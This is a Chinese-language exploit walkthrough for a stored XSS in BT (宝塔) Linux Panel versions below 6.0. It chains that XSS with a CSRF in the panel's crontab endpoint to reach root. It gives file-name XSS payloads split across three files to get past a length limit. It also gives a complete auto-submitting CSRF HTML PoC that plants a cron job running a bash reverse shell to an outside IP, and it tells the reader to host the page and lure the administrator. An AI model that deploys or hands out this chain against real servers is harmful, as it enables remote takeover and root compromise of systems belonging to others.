## 宝塔linux面板 <6.0 存储形xss 0day漏洞getshell

## 漏洞描述

宝塔面板是什么就不说了，小于6.0的版本存在存储性xss，该版本比较古老了，如果遇到了还是可以一用。

## 漏洞影响

> 宝塔Linux面板<6.0

## 漏洞复现

假设我们已经通过网站漏洞或者ftp弱口令等,可以在web目录下进行文件上传

在web目录下上传一个文件名为 `<img src=x onerror="alert(1)">`的文件

![1](resource/宝塔存储xss/1.png)

在宝塔后台浏览文件,触发payload

![2](resource/宝塔存储xss/2.png)

但是由于宝塔的session加了httponly,所以我们是无法获取到宝塔的cookie的,但是我们可以配合计划任务的一个csrf的漏洞来达到权限提升的效果

POC

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://1.1.1.1:8888/crontab?action=AddCrontab" method="POST">
      <input type="hidden" name="name" value="test" />
      <input type="hidden" name="type" value="minute-n" />
      <input type="hidden" name="where1" value="5" />
      <input type="hidden" name="hour" value="" />
      <input type="hidden" name="minute" value="" />
      <input type="hidden" name="week" value="" />
      <input type="hidden" name="sType" value="toShell" />
      <input type="hidden" name="sBody" value="bash -i >& /dev/tcp/1.1.1.1/1998 0>&1" />
      <input type="hidden" name="sName" value="" />
      <input type="hidden" name="backupTo" value="localhost" />
      <input type="hidden" name="urladdress" value="" />
      <input type="hidden" name="save" value="" />
      <input type="hidden" name="sBody" value="bash -i >& /dev/tcp/1.1.1.1/1998 0>&1" />
      <input type="hidden" name="urladdress" value="" />
      <input type="submit" id="a" value="Submit request" />
    </form>
  </body>
  <script>
    document.getElementById('a').click()
</script>
</html>
```

修改poc中的ip地址,保存到网页上传到test.com中,当宝塔管理员访问这个页面以后,会自动跳转到

![3](resource/宝塔存储xss/3.png)

后台会自动添加反弹shell的计划任务

![4](resource/宝塔存储xss/4.png)

![5](resource/宝塔存储xss/5.png)

现在准备就绪,只要让管理员打开这个网页就可以了

回到上传文件的地方,因为有触发点有字符数限制,所以用多个语句构造,因为执行顺序的关系,可能需要刷新一下文件管理即可触发

![6](resource/宝塔存储xss/6.png)

新建三个文件,文件名分别为

```
a<img src=x onerror="a=String.fromCharCode(47)">
b<img src=x onerror="b='.com'">
c<img src=x onerror="window.open(a+a+'test'+b)">
```

payload触发以后会自动打开test.com网页

![7](resource/宝塔存储xss/7.png)

将上一步CSRF的payload部署到test.com,管理员浏览文件的时候即可触发,触发后五分钟会反弹shell

![8](resource/宝塔存储xss/8.png)

root权限~